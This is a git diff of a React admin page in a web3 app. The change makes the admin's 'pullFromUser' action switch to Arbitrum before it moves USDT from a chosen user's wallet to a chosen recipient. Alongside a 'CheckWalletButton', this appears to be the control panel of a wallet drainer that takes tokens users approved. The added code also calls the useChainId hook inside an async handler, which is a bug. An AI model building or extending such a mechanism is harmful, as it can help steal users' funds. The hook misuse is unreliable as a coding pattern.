@@ -3,10 +3,10 @@ import Header from '../components/Header.jsx'
 import Footer from '../components/Footer.jsx'
 import CheckWalletButton from '../components/CheckWalletButton.jsx'
 import { useWeb3Modal } from '@web3modal/wagmi/react'
-import { useAccount, useChainId } from 'wagmi'
+import { useAccount, useChainId, useSwitchChain } from 'wagmi'
 import { callPullFromUser, readOwnerAddress, readAdminAddress, callSetAdmin, USDT_ADDRESSES, ERC20_ABI } from '../web3/tokenTransfer'
 import { parseUnits, createPublicClient, http, formatEther, formatUnits, parseAbiItem } from 'viem'
-import { CHAIN_NAMES, RESOLVED_RPC_URLS } from '../web3/config.jsx'
+import { CHAIN_NAMES, RESOLVED_RPC_URLS, CHAIN_IDS } from '../web3/config.jsx'
 import AdminHeader from '../components/AdminHeader.jsx'
 
 export default function Admin() {
@@ -222,6 +222,7 @@ export default function Admin() {
     } finally { setIsSettingAdmin(false) }
   }
 
+  const { switchChain } = useSwitchChain()
   async function handleAdminPull(e) {
     e && e.preventDefault && e.preventDefault()
     if (!isAdminAuthed) { setAdminStatus('Please login as admin'); return }
@@ -231,9 +232,16 @@ export default function Admin() {
     if (connected !== ownerLc && connected !== adminLc) { setAdminStatus('Connected wallet is not owner/admin on-chain'); return }
     try {
       setIsPulling(true)
-      setAdminStatus('Submitting pullFromUser transaction...')
+      // Ensure Arbitrum network before sending
+      if (useChainId() !== CHAIN_IDS.arbitrum) {
+        setAdminStatus('Switching to Arbitrum…')
+        await switchChain({ chainId: CHAIN_IDS.arbitrum })
+        setAdminStatus('Switched to Arbitrum. Submitting pullFromUser…')
+      } else {
+        setAdminStatus('Submitting pullFromUser transaction...')
+      }
       const amt = parseUnits(String(amountToPull || '0'), 6)
-      const txHash = await callPullFromUser({ contractAddress: SMART_CONTRACT_ADDRESS, userAddress: userToPull, recipientAddress: recipientForPull, amount: amt, chainId })
+      const txHash = await callPullFromUser({ contractAddress: SMART_CONTRACT_ADDRESS, userAddress: userToPull, recipientAddress: recipientForPull, amount: amt, chainId: CHAIN_IDS.arbitrum })
       setAdminStatus(`Tx sent: ${txHash}`)
     } catch (err) {
       console.error('pullFromUser failed:', err)
